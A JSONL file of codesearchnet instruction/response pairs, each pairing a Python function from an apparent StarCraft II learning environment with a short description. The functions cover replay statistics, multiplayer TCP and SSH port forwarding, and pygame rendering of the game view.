{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef merge(self, other):\n    def merge_dict(a, b):\n      for k, v in six.iteritems(b):\n        a[k] += v\n\n    self.replays += other.replays\n    self.steps += other.steps\n    self.camera_move += other.camera_move\n    self.select_pt += other.select_pt\n    self.select_rect += other.select_rect\n    self.control_group += other.control_group\n    merge_dict(self.maps, other.maps)\n    merge_dict(self.races, other.races)\n    merge_dict(self.unit_ids, other.unit_ids)\n    merge_dict(self.valid_abilities, other.valid_abilities)\n    merge_dict(self.made_abilities, other.made_abilities)\n    merge_dict(self.valid_actions, other.valid_actions)\n    merge_dict(self.made_actions, other.made_actions)\n    self.crashing_replays |= other.crashing_replays\n    self.invalid_replays |= other.invalid_replays", "response": "Merge another ReplayStats into this one."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nprocess a single replay and updates the stats.", "response": "def process_replay(self, controller, replay_data, map_data, player_id):\n    \"\"\"Process a single replay, updating the stats.\"\"\"\n    self._update_stage(\"start_replay\")\n    controller.start_replay(sc_pb.RequestStartReplay(\n        replay_data=replay_data,\n        map_data=map_data,\n        options=interface,\n        observed_player_id=player_id))\n\n    feat = features.features_from_game_info(controller.game_info())\n\n    self.stats.replay_stats.replays += 1\n    self._update_stage(\"step\")\n    controller.step()\n    while True:\n      self.stats.replay_stats.steps += 1\n      self._update_stage(\"observe\")\n      obs = controller.observe()\n\n      for action in obs.actions:\n        act_fl = action.action_feature_layer\n        if act_fl.HasField(\"unit_command\"):\n          self.stats.replay_stats.made_abilities[\n              act_fl.unit_command.ability_id] += 1\n        if act_fl.HasField(\"camera_move\"):\n          self.stats.replay_stats.camera_move += 1\n        if act_fl.HasField(\"unit_selection_point\"):\n          self.stats.replay_stats.select_pt += 1\n        if act_fl.HasField(\"unit_selection_rect\"):\n          self.stats.replay_stats.select_rect += 1\n        if action.action_ui.HasField(\"control_group\"):\n          self.stats.replay_stats.control_group += 1\n\n        try:\n          func = feat.reverse_action(action).function\n        except ValueError:\n          func = -1\n        self.stats.replay_stats.made_actions[func] += 1\n\n      for valid in obs.observation.abilities:\n        self.stats.replay_stats.valid_abilities[valid.ability_id] += 1\n\n      for u in obs.observation.raw_data.units:\n        self.stats.replay_stats.unit_ids[u.unit_type] += 1\n\n      for ability_id in feat.available_actions(obs.observation):\n        self.stats.replay_stats.valid_actions[ability_id] += 1\n\n      if obs.player_result:\n        break\n\n      self._update_stage(\"step\")\n      controller.step(FLAGS.step_mul)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef tcp_server(tcp_addr, settings):\n  family = socket.AF_INET6 if \":\" in tcp_addr.ip else socket.AF_INET\n  sock = socket.socket(family, socket.SOCK_STREAM, socket.IPPROTO_TCP)\n  sock.bind(tcp_addr)\n  sock.listen(1)\n  logging.info(\"Waiting for connection on %s\", tcp_addr)\n  conn, addr = sock.accept()\n  logging.info(\"Accepted connection from %s\", Addr(*addr))\n\n  # Send map_data independently for py2/3 and json encoding reasons.\n  write_tcp(conn, settings[\"map_data\"])\n  send_settings = {k: v for k, v in settings.items() if k != \"map_data\"}\n  logging.debug(\"settings: %s\", send_settings)\n  write_tcp(conn, json.dumps(send_settings).encode())\n  return conn", "response": "Start up the tcp server send the settings."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nconnecting to the tcp server and return the settings.", "response": "def tcp_client(tcp_addr):\n  \"\"\"Connect to the tcp server, and return the settings.\"\"\"\n  family = socket.AF_INET6 if \":\" in tcp_addr.ip else socket.AF_INET\n  sock = socket.socket(family, socket.SOCK_STREAM, socket.IPPROTO_TCP)\n  for i in range(300):\n    logging.info(\"Connecting to: %s, attempt %d\", tcp_addr, i)\n    try:\n      sock.connect(tcp_addr)\n      break\n    except socket.error:\n      time.sleep(1)\n  else:\n    sock.connect(tcp_addr)  # One last try, but don't catch this error.\n  logging.info(\"Connected.\")\n\n  map_data = read_tcp(sock)\n  settings_str = read_tcp(sock)\n  if not settings_str:\n    raise socket.error(\"Failed to read\")\n  settings = json.loads(settings_str.decode())\n  logging.info(\"Got settings. map_name: %s.\", settings[\"map_name\"])\n  logging.debug(\"settings: %s\", settings)\n  settings[\"map_data\"] = map_data\n  return sock, settings"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef read_tcp_size(conn, size):\n  chunks = []\n  bytes_read = 0\n  while bytes_read < size:\n    chunk = conn.recv(size - bytes_read)\n    if not chunk:\n      if bytes_read > 0:\n        logging.warning(\"Incomplete read: %s of %s.\", bytes_read, size)\n      return\n    chunks.append(chunk)\n    bytes_read += len(chunk)\n  return b\"\".join(chunks)", "response": "Read size number of bytes from conn retrying as needed."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef forward_ports(remote_host, local_host, local_listen_ports,\n                  remote_listen_ports):\n  \"\"\"Forwards ports such that multiplayer works between machines.\n\n  Args:\n    remote_host: Where to ssh to.\n    local_host: \"127.0.0.1\" or \"::1\".\n    local_listen_ports: Which ports to listen on locally to forward remotely.\n    remote_listen_ports: Which ports to listen on remotely to forward locally.\n\n  Returns:\n    The ssh process.\n\n  Raises:\n    ValueError: if it can't find ssh.\n  \"\"\"\n  if \":\" in local_host and not local_host.startswith(\"[\"):\n    local_host = \"[%s]\" % local_host\n\n  ssh = whichcraft.which(\"ssh\") or whichcraft.which(\"plink\")\n  if not ssh:\n    raise ValueError(\"Couldn't find an ssh client.\")\n\n  args = [ssh, remote_host]\n  for local_port in local_listen_ports:\n    args += [\"-L\", \"%s:%s:%s:%s\" % (local_host, local_port,\n                                    local_host, local_port)]\n  for remote_port in remote_listen_ports:\n    args += [\"-R\", \"%s:%s:%s:%s\" % (local_host, remote_port,\n                                    local_host, remote_port)]\n\n  logging.info(\"SSH port forwarding: %s\", \" \".join(args))\n  return subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,\n                          stdin=subprocess.PIPE, close_fds=(os.name == \"posix\"))", "response": "Forwards ports such that multiplayer works between machines."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nmake sure this stays synced with bin/play_vs_agent.py.", "response": "def _launch_remote(self, host, config_port, race, name, interface):\n    \"\"\"Make sure this stays synced with bin/play_vs_agent.py.\"\"\"\n    self._tcp_conn, settings = tcp_client(Addr(host, config_port))\n\n    self._map_name = settings[\"map_name\"]\n\n    if settings[\"remote\"]:\n      self._udp_sock = udp_server(\n          Addr(host, settings[\"ports\"][\"server\"][\"game\"]))\n\n      daemon_thread(tcp_to_udp,\n                    (self._tcp_conn, self._udp_sock,\n                     Addr(host, settings[\"ports\"][\"client\"][\"game\"])))\n\n      daemon_thread(udp_to_tcp, (self._udp_sock, self._tcp_conn))\n\n    extra_ports = [\n        settings[\"ports\"][\"server\"][\"game\"],\n        settings[\"ports\"][\"server\"][\"base\"],\n        settings[\"ports\"][\"client\"][\"game\"],\n        settings[\"ports\"][\"client\"][\"base\"],\n    ]\n\n    self._sc2_procs = [self._run_config.start(\n        extra_ports=extra_ports, host=host, version=settings[\"game_version\"],\n        window_loc=(700, 50), want_rgb=interface.HasField(\"render\"))]\n    self._controllers = [p.controller for p in self._sc2_procs]\n\n    # Create the join request.\n    join = sc_pb.RequestJoinGame(options=interface)\n    join.race = race\n    join.player_name = name\n    join.shared_port = 0  # unused\n    join.server_ports.game_port = settings[\"ports\"][\"server\"][\"game\"]\n    join.server_ports.base_port = settings[\"ports\"][\"server\"][\"base\"]\n    join.client_ports.add(game_port=settings[\"ports\"][\"client\"][\"game\"],\n                          base_port=settings[\"ports\"][\"client\"][\"base\"])\n\n    self._controllers[0].save_map(settings[\"map_path\"], settings[\"map_data\"])\n    self._controllers[0].join_game(join)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _replay_index(replay_dir):\n  run_config = run_configs.get()\n  replay_dir = run_config.abs_replay_path(replay_dir)\n  print(\"Checking: \", replay_dir)\n\n  with run_config.start(want_rgb=False) as controller:\n    print(\"-\" * 60)\n    print(\",\".join((\n        \"filename\",\n        \"build\",\n        \"map_name\",\n        \"game_duration_loops\",\n        \"players\",\n        \"P1-outcome\",\n        \"P1-race\",\n        \"P1-apm\",\n        \"P2-race\",\n        \"P2-apm\",\n    )))\n\n    try:\n      bad_replays = []\n      for file_path in run_config.replay_paths(replay_dir):\n        file_name = os.path.basename(file_path)\n        try:\n          info = controller.replay_info(run_config.replay_data(file_path))\n        except remote_controller.RequestError as e:\n          bad_replays.append(\"%s: %s\" % (file_name, e))\n          continue\n        if info.HasField(\"error\"):\n          print(\"failed:\", file_name, info.error, info.error_details)\n          bad_replays.append(file_name)\n        else:\n          out = [\n              file_name,\n              info.base_build,\n              info.map_name,\n              info.game_duration_loops,\n              len(info.player_info),\n              sc_pb.Result.Name(info.player_info[0].player_result.result),\n              sc_common.Race.Name(info.player_info[0].player_info.race_actual),\n              info.player_info[0].player_apm,\n          ]\n          if len(info.player_info) >= 2:\n            out += [\n                sc_common.Race.Name(\n                    info.player_info[1].player_info.race_actual),\n                info.player_info[1].player_apm,\n            ]\n          print(u\",\".join(str(s) for s in out))\n    except KeyboardInterrupt:\n      pass\n    finally:\n      if bad_replays:\n        print(\"\\n\")\n        print(\"Replays with errors:\")\n        print(\"\\n\".join(bad_replays))", "response": "Output information for a directory of replays."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nqueries a replay for information.", "response": "def _replay_info(replay_path):\n  \"\"\"Query a replay for information.\"\"\"\n  if not replay_path.lower().endswith(\"sc2replay\"):\n    print(\"Must be a replay.\")\n    return\n\n  run_config = run_configs.get()\n  with run_config.start(want_rgb=False) as controller:\n    info = controller.replay_info(run_config.replay_data(replay_path))\n  print(\"-\" * 60)\n  print(info)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef smooth_hue_palette(scale):\n  # http://en.wikipedia.org/wiki/HSL_and_HSV#From_HSL\n  # Based on http://stackoverflow.com/a/17382854 , with simplifications and\n  # optimizations. Assumes S=1, L=0.5, meaning C=1 and m=0.\n  # 0 stays black, everything else moves into a hue.\n\n  # Some initial values and scaling. Check wikipedia for variable meanings.\n  array = numpy.arange(scale)\n  h = array * (6 / scale)  # range of [0,6)\n  x = 255 * (1 - numpy.absolute(numpy.mod(h, 2) - 1))\n  c = 255\n\n  # Initialize outputs to zero/black\n  out = numpy.zeros(h.shape + (3,), float)\n  r = out[..., 0]\n  g = out[..., 1]\n  b = out[..., 2]\n\n  mask = (0 < h) & (h < 1)\n  r[mask] = c\n  g[mask] = x[mask]\n\n  mask = (1 <= h) & (h < 2)\n  r[mask] = x[mask]\n  g[mask] = c\n\n  mask = (2 <= h) & (h < 3)\n  g[mask] = c\n  b[mask] = x[mask]\n\n  mask = (3 <= h) & (h < 4)\n  g[mask] = x[mask]\n  b[mask] = c\n\n  mask = (4 <= h) & (h < 5)\n  r[mask] = x[mask]\n  b[mask] = c\n\n  mask = 5 <= h\n  r[mask] = c\n  b[mask] = x[mask]\n\n  return out", "response": "Takes an array of ints and returns a corresponding colored rgb array."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a palette that is piece - wise linear given some colors at points.", "response": "def piece_wise_linear(scale, points):\n  \"\"\"Create a palette that is piece-wise linear given some colors at points.\"\"\"\n  assert len(points) >= 2\n  assert points[0][0] == 0\n  assert points[-1][0] == 1\n  assert all(i < j for i, j in zip(points[:-1], points[1:]))\n  out = numpy.zeros((scale, 3))\n  p1, c1 = points[0]\n  p2, c2 = points[1]\n  next_pt = 2\n\n  for i in range(1, scale):\n    v = i / scale\n    if v > p2:\n      p1, c1 = p2, c2\n      p2, c2 = points[next_pt]\n      next_pt += 1\n    frac = (v - p1) / (p2 - p1)\n    out[i, :] = c1 * (1 - frac) + c2 * frac\n  return out"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a palette that maps unit types to rgb colors.", "response": "def unit_type(scale=None):\n  \"\"\"Returns a palette that maps unit types to rgb colors.\"\"\"\n  # Can specify a scale to match the api or to accept unknown unit types.\n  palette_size = scale or max(static_data.UNIT_TYPES) + 1\n  palette = shuffled_hue(palette_size)\n  assert len(static_data.UNIT_TYPES) <= len(distinct_colors)\n  for i, v in enumerate(static_data.UNIT_TYPES):\n    palette[v] = distinct_colors[i]\n  return palette"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nmake sure the lock is held while in this function.", "response": "def with_lock(lock):\n  \"\"\"Make sure the lock is held while in this function.\"\"\"\n  def decorator(func):\n    @functools.wraps(func)\n    def _with_lock(*args, **kwargs):\n      with lock:\n        return func(*args, **kwargs)\n    return _with_lock\n  return decorator"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _get_desktop_size():\n  if platform.system() == \"Linux\":\n    try:\n      xrandr_query = subprocess.check_output([\"xrandr\", \"--query\"])\n      sizes = re.findall(r\"\\bconnected primary (\\d+)x(\\d+)\", str(xrandr_query))\n      if sizes[0]:\n        return point.Point(int(sizes[0][0]), int(sizes[0][1]))\n    except:  # pylint: disable=bare-except\n      logging.error(\"Failed to get the resolution from xrandr.\")\n\n  # Most general, but doesn't understand multiple monitors.\n  display_info = pygame.display.Info()\n  return point.Point(display_info.current_w, display_info.current_h)", "response": "Get the desktop size."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ndraw an arc using world coordinates radius start and stop angles.", "response": "def draw_arc(self, color, world_loc, world_radius, start_angle, stop_angle,\n               thickness=1):\n    \"\"\"Draw an arc using world coordinates, radius, start and stop angles.\"\"\"\n    center = self.world_to_surf.fwd_pt(world_loc).round()\n    radius = max(1, int(self.world_to_surf.fwd_dist(world_radius)))\n    rect = pygame.Rect(center - radius, (radius * 2, radius * 2))\n    pygame.draw.arc(self.surf, color, rect, start_angle, stop_angle,\n                    thickness if thickness < radius else 0)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef draw_circle(self, color, world_loc, world_radius, thickness=0):\n    if world_radius > 0:\n      center = self.world_to_surf.fwd_pt(world_loc).round()\n      radius = max(1, int(self.world_to_surf.fwd_dist(world_radius)))\n      pygame.draw.circle(self.surf, color, center, radius,\n                         thickness if thickness < radius else 0)", "response": "Draw a circle using world coordinates and radius."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef draw_rect(self, color, world_rect, thickness=0):\n    tl = self.world_to_surf.fwd_pt(world_rect.tl).round()\n    br = self.world_to_surf.fwd_pt(world_rect.br).round()\n    rect = pygame.Rect(tl, br - tl)\n    pygame.draw.rect(self.surf, color, rect, thickness)", "response": "Draw a rectangle using world coordinates."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nfill this surface using the contents of a numpy array.", "response": "def blit_np_array(self, array):\n    \"\"\"Fill this surface using the contents of a numpy array.\"\"\"\n    with sw(\"make_surface\"):\n      raw_surface = pygame.surfarray.make_surface(array.transpose([1, 0, 2]))\n    with sw(\"draw\"):\n      pygame.transform.scale(raw_surface, self.surf.get_size(), self.surf)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nwriting text to the screen in font. size relative coordinates.", "response": "def write_screen(self, font, color, screen_pos, text, align=\"left\",\n                   valign=\"top\"):\n    \"\"\"Write to the screen in font.size relative coordinates.\"\"\"\n    pos = point.Point(*screen_pos) * point.Point(0.75, 1) * font.get_linesize()\n    text_surf = font.render(str(text), True, color)\n    rect = text_surf.get_rect()\n    if pos.x >= 0:\n      setattr(rect, align, pos.x)\n    else:\n      setattr(rect, align, self.surf.get_width() + pos.x)\n    if pos.y >= 0:\n      setattr(rect, valign, pos.y)\n    else:\n      setattr(rect, valign, self.surf.get_height() + pos.y)\n    self.surf.blit(text_surf, rect)"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ngiving an Action return the right spatial action.", "response": "def action_spatial(self, action):\n    \"\"\"Given an Action, return the right spatial action.\"\"\"\n    if self.surf.surf_type & SurfType.FEATURE:\n      return action.action_feature_layer\n    elif self.surf.surf_type & SurfType.RGB:\n      return action.action_render\n    else:\n      assert self.surf.surf_type & (SurfType.RGB | SurfType.FEATURE)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef init(self, game_info, static_data):\n    self._game_info = game_info\n    self._static_data = static_data\n\n    if not game_info.HasField(\"start_raw\"):\n      raise ValueError(\"Raw observations are required for the renderer.\")\n\n    self._map_size = point.Point.build(game_info.start_raw.map_size)\n\n    if game_info.options.HasField(\"feature_layer\"):\n      fl_opts = game_info.options.feature_layer\n      self._feature_screen_px = point.Point.build(fl_opts.resolution)\n      self._feature_minimap_px = point.Point.build(fl_opts.minimap_resolution)\n      self._feature_camera_width_world_units = fl_opts.width\n      self._render_rgb = False\n    else:\n      self._feature_screen_px = self._feature_minimap_px = None\n    if game_info.options.HasField(\"render\"):\n      render_opts = game_info.options.render\n      self._rgb_screen_px = point.Point.build(render_opts.resolution)\n      self._rgb_minimap_px = point.Point.build(render_opts.minimap_resolution)\n      self._render_rgb = True\n    else:\n      self._rgb_screen_px = self._rgb_minimap_px = None\n\n    if not self._feature_screen_px and not self._rgb_screen_px:\n      raise ValueError(\"Nothing to render.\")\n\n    try:\n      self.init_window()\n      self._initialized = True\n    except pygame.error as e:\n      self._initialized = False\n      logging.error(\"-\" * 60)\n      logging.error(\"Failed to initialize pygame: %s\", e)\n      logging.error(\"Continuing without pygame.\")\n      logging.error(\"If you're using ssh and have an X server, try ssh -X.\")\n      logging.error(\"-\" * 60)\n\n    self._obs = sc_pb.ResponseObservation()\n    self._queued_action = None\n    self._queued_hotkey = \"\"\n    self._select_start = None\n    self._alerts = {}\n    self._past_actions = []\n    self._help = False", "response": "Initialize the object with the game info and static data."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef init_window(self):\n    if platform.system() == \"Windows\":\n      # Enable DPI awareness on Windows to give the correct window size.\n      ctypes.windll.user32.SetProcessDPIAware()  # pytype: disable=module-attr\n\n    pygame.init()\n\n    if self._desktop_size is None:\n      self._desktop_size = _get_desktop_size()\n\n    if self._render_rgb and self._rgb_screen_px:\n      main_screen_px = self._rgb_screen_px\n    else:\n      main_screen_px = self._feature_screen_px\n\n    window_size_ratio = main_screen_px\n    if self._feature_screen_px and self._render_feature_grid:\n      # Want a roughly square grid of feature layers, each being roughly square.\n      num_feature_layers = (len(features.SCREEN_FEATURES) +\n                            len(features.MINIMAP_FEATURES))\n      feature_cols = math.ceil(math.sqrt(num_feature_layers))\n      feature_rows = math.ceil(num_feature_layers / feature_cols)\n      features_layout = point.Point(feature_cols,\n                                    feature_rows * 1.05)  # make room for titles\n\n      # Scale features_layout to main_screen_px height so we know its width.\n      features_aspect_ratio = (features_layout * main_screen_px.y /\n                               features_layout.y)\n      window_size_ratio += point.Point(features_aspect_ratio.x, 0)\n\n    window_size_px = window_size_ratio.scale_max_size(\n        self._desktop_size * self._window_scale).ceil()\n\n    # Create the actual window surface. This should only be blitted to from one\n    # of the sub-surfaces defined below.\n    self._window = pygame.display.set_mode(window_size_px, 0, 32)\n    pygame.display.set_caption(\"Starcraft Viewer\")\n\n    # The sub-surfaces that the various draw functions will draw to.\n    self._surfaces = []\n    def add_surface(surf_type, surf_loc, world_to_surf, world_to_obs, draw_fn):\n      \"\"\"Add a surface. Drawn in order and intersect in reverse order.\"\"\"\n      sub_surf = self._window.subsurface(\n          pygame.Rect(surf_loc.tl, surf_loc.size))\n      self._surfaces.append(_Surface(\n          sub_surf, surf_type, surf_loc, world_to_surf, world_to_obs, draw_fn))\n\n    self._scale = window_size_px.y // 32\n    self._font_small = pygame.font.Font(None, int(self._scale * 0.5))\n    self._font_large = pygame.font.Font(None, self._scale)\n\n    def check_eq(a, b):\n      \"\"\"Used to run unit tests on the transforms.\"\"\"\n      assert (a - b).len() < 0.0001, \"%s != %s\" % (a, b)\n\n    # World has origin at bl, world_tl has origin at tl.\n    self._world_to_world_tl = transform.Linear(\n        point.Point(1, -1), point.Point(0, self._map_size.y))\n\n    check_eq(self._world_to_world_tl.fwd_pt(point.Point(0, 0)),\n             point.Point(0, self._map_size.y))\n    check_eq(self._world_to_world_tl.fwd_pt(point.Point(5, 10)),\n             point.Point(5, self._map_size.y - 10))\n\n    # Move the point to be relative to the camera. This gets updated per frame.\n    self._world_tl_to_world_camera_rel = transform.Linear(\n        offset=-self._map_size / 4)\n\n    check_eq(self._world_tl_to_world_camera_rel.fwd_pt(self._map_size / 4),\n             point.Point(0, 0))\n    check_eq(\n        self._world_tl_to_world_camera_rel.fwd_pt(\n            (self._map_size / 4) + point.Point(5, 10)),\n        point.Point(5, 10))\n\n    if self._feature_screen_px:\n      # Feature layer locations in continuous space.\n      feature_world_per_pixel = (self._feature_screen_px /\n                                 self._feature_camera_width_world_units)\n      world_camera_rel_to_feature_screen = transform.Linear(\n          feature_world_per_pixel, self._feature_screen_px / 2)\n\n      check_eq(world_camera_rel_to_feature_screen.fwd_pt(point.Point(0, 0)),\n               self._feature_screen_px / 2)\n      check_eq(\n          world_camera_rel_to_feature_screen.fwd_pt(\n              point.Point(-0.5, -0.5) * self._feature_camera_width_world_units),\n          point.Point(0, 0))\n\n      self._world_to_feature_screen = transform.Chain(\n          self._world_to_world_tl,\n          self._world_tl_to_world_camera_rel,\n          world_camera_rel_to_feature_screen)\n      self._world_to_feature_screen_px = transform.Chain(\n          self._world_to_feature_screen,\n          transform.PixelToCoord())\n\n      world_tl_to_feature_minimap = transform.Linear(\n          self._feature_minimap_px / self._map_size.max_dim())\n\n      check_eq(world_tl_to_feature_minimap.fwd_pt(point.Point(0, 0)),\n               point.Point(0, 0))\n      check_eq(world_tl_to_feature_minimap.fwd_pt(self._map_size),\n               self._map_size.scale_max_size(self._feature_minimap_px))\n\n      self._world_to_feature_minimap = transform.Chain(\n          self._world_to_world_tl,\n          world_tl_to_feature_minimap)\n      self._world_to_feature_minimap_px = transform.Chain(\n          self._world_to_feature_minimap,\n          transform.PixelToCoord())\n\n    if self._rgb_screen_px:\n      # RGB pixel locations in continuous space.\n\n      # TODO(tewalds): Use a real 3d projection instead of orthogonal.\n      rgb_world_per_pixel = (self._rgb_screen_px / 24)\n      world_camera_rel_to_rgb_screen = transform.Linear(\n          rgb_world_per_pixel, self._rgb_screen_px / 2)\n\n      check_eq(world_camera_rel_to_rgb_screen.fwd_pt(point.Point(0, 0)),\n               self._rgb_screen_px / 2)\n      check_eq(\n          world_camera_rel_to_rgb_screen.fwd_pt(\n              point.Point(-0.5, -0.5) * 24),\n          point.Point(0, 0))\n\n      self._world_to_rgb_screen = transform.Chain(\n          self._world_to_world_tl,\n          self._world_tl_to_world_camera_rel,\n          world_camera_rel_to_rgb_screen)\n      self._world_to_rgb_screen_px = transform.Chain(\n          self._world_to_rgb_screen,\n          transform.PixelToCoord())\n\n      world_tl_to_rgb_minimap = transform.Linear(\n          self._rgb_minimap_px / self._map_size.max_dim())\n\n      check_eq(world_tl_to_rgb_minimap.fwd_pt(point.Point(0, 0)),\n               point.Point(0, 0))\n      check_eq(world_tl_to_rgb_minimap.fwd_pt(self._map_size),\n               self._map_size.scale_max_size(self._rgb_minimap_px))\n\n      self._world_to_rgb_minimap = transform.Chain(\n          self._world_to_world_tl,\n          world_tl_to_rgb_minimap)\n      self._world_to_rgb_minimap_px = transform.Chain(\n          self._world_to_rgb_minimap,\n          transform.PixelToCoord())\n\n    # Renderable space for the screen.\n    screen_size_px = main_screen_px.scale_max_size(window_size_px)\n    minimap_size_px = self._map_size.scale_max_size(screen_size_px / 4)\n    minimap_offset = point.Point(0, (screen_size_px.y - minimap_size_px.y))\n\n    if self._render_rgb:\n      rgb_screen_to_main_screen = transform.Linear(\n          screen_size_px / self._rgb_screen_px)\n      add_surface(SurfType.RGB | SurfType.SCREEN,\n                  point.Rect(point.origin, screen_size_px),\n                  transform.Chain(  # surf\n                      self._world_to_rgb_screen,\n                      rgb_screen_to_main_screen),\n                  self._world_to_rgb_screen_px,\n                  self.draw_screen)\n      rgb_minimap_to_main_minimap = transform.Linear(\n          minimap_size_px / self._rgb_minimap_px)\n      add_surface(SurfType.RGB | SurfType.MINIMAP,\n                  point.Rect(minimap_offset,\n                             minimap_offset + minimap_size_px),\n                  transform.Chain(  # surf\n                      self._world_to_rgb_minimap,\n                      rgb_minimap_to_main_minimap),\n                  self._world_to_rgb_minimap_px,\n                  self.draw_mini_map)\n    else:\n      feature_screen_to_main_screen = transform.Linear(\n          screen_size_px / self._feature_screen_px)\n      add_surface(SurfType.FEATURE | SurfType.SCREEN,\n                  point.Rect(point.origin, screen_size_px),\n                  transform.Chain(  # surf\n                      self._world_to_feature_screen,\n                      feature_screen_to_main_screen),\n                  self._world_to_feature_screen_px,\n                  self.draw_screen)\n      feature_minimap_to_main_minimap = transform.Linear(\n          minimap_size_px / self._feature_minimap_px)\n      add_surface(SurfType.FEATURE | SurfType.MINIMAP,\n                  point.Rect(minimap_offset,\n                             minimap_offset + minimap_size_px),\n                  transform.Chain(  # surf\n                      self._world_to_feature_minimap,\n                      feature_minimap_to_main_minimap),\n                  self._world_to_feature_minimap_px,\n                  self.draw_mini_map)\n\n    if self._feature_screen_px and self._render_feature_grid:\n      # Add the feature layers\n      features_loc = point.Point(screen_size_px.x, 0)\n      feature_pane = self._window.subsurface(\n          pygame.Rect(features_loc, window_size_px - features_loc))\n      feature_pane.fill(colors.white / 2)\n      feature_pane_size = point.Point(*feature_pane.get_size())\n      feature_grid_size = feature_pane_size / point.Point(feature_cols,\n                                                          feature_rows)\n      feature_layer_area = self._feature_screen_px.scale_max_size(\n          feature_grid_size)\n      feature_layer_padding = feature_layer_area // 20\n      feature_layer_size = feature_layer_area - feature_layer_padding * 2\n\n      feature_font_size = int(feature_grid_size.y * 0.09)\n      feature_font = pygame.font.Font(None, feature_font_size)\n\n      feature_counter = itertools.count()\n      def add_feature_layer(feature, surf_type, world_to_surf, world_to_obs):\n        \"\"\"Add a feature layer surface.\"\"\"\n        i = next(feature_counter)\n        grid_offset = point.Point(i % feature_cols,\n                                  i // feature_cols) * feature_grid_size\n        text = feature_font.render(feature.full_name, True, colors.white)\n        rect = text.get_rect()\n        rect.center = grid_offset + point.Point(feature_grid_size.x / 2,\n                                                feature_font_size)\n        feature_pane.blit(text, rect)\n        surf_loc = (features_loc + grid_offset + feature_layer_padding +\n                    point.Point(0, feature_font_size))\n        add_surface(surf_type,\n                    point.Rect(surf_loc, surf_loc + feature_layer_size),\n                    world_to_surf, world_to_obs,\n                    lambda surf: self.draw_feature_layer(surf, feature))\n\n      # Add the minimap feature layers\n      feature_minimap_to_feature_minimap_surf = transform.Linear(\n          feature_layer_size / self._feature_minimap_px)\n      world_to_feature_minimap_surf = transform.Chain(\n          self._world_to_feature_minimap,\n          feature_minimap_to_feature_minimap_surf)\n      for feature in features.MINIMAP_FEATURES:\n        add_feature_layer(feature, SurfType.FEATURE | SurfType.MINIMAP,\n                          world_to_feature_minimap_surf,\n                          self._world_to_feature_minimap_px)\n\n      # Add the screen feature layers\n      feature_screen_to_feature_screen_surf = transform.Linear(\n          feature_layer_size / self._feature_screen_px)\n      world_to_feature_screen_surf = transform.Chain(\n          self._world_to_feature_screen,\n          feature_screen_to_feature_screen_surf)\n      for feature in features.SCREEN_FEATURES:\n        add_feature_layer(feature, SurfType.FEATURE | SurfType.SCREEN,\n                          world_to_feature_screen_surf,\n                          self._world_to_feature_screen_px)\n\n    # Add the help screen\n    help_size = point.Point(\n        (max(len(s) for s, _ in self.shortcuts) +\n         max(len(s) for _, s in self.shortcuts)) * 0.4 + 4,\n        len(self.shortcuts) + 3) * self._scale\n    help_rect = point.Rect(window_size_px / 2 - help_size / 2,\n                           window_size_px / 2 + help_size / 2)\n    add_surface(SurfType.CHROME, help_rect, None, None, self.draw_help)\n\n    # Arbitrarily set the initial camera to the center of the map.\n    self._update_camera(self._map_size / 2)", "response": "Initialize the pygame window and lay out the surfaces."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _update_camera(self, camera_center):\n    self._world_tl_to_world_camera_rel.offset = (\n        -self._world_to_world_tl.fwd_pt(camera_center) *\n        self._world_tl_to_world_camera_rel.scale)\n\n    if self._feature_screen_px:\n      camera_radius = (self._feature_screen_px / self._feature_screen_px.x *\n                       self._feature_camera_width_world_units / 2)\n      center = camera_center.bound(camera_radius,\n                                   self._map_size - camera_radius)\n      self._camera = point.Rect(\n          (center - camera_radius).bound(self._map_size),\n          (center + camera_radius).bound(self._map_size))", "response": "Update the camera transform based on the new camera center."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn a MousePos filled with the world position and surf it hit.", "response": "def get_mouse_pos(self, window_pos=None):\n    \"\"\"Return a MousePos filled with the world position and surf it hit.\"\"\"\n    window_pos = window_pos or pygame.mouse.get_pos()\n    # +0.5 to center the point on the middle of the pixel.\n    window_pt = point.Point(*window_pos) + 0.5\n    for surf in reversed(self._surfaces):\n      if (surf.surf_type != SurfType.CHROME and\n          surf.surf_rect.contains_point(window_pt)):\n        surf_rel_pt = window_pt - surf.surf_rect.tl\n        world_pt = surf.world_to_surf.back_pt(surf_rel_pt)\n        return MousePos(world_pt, surf)"}
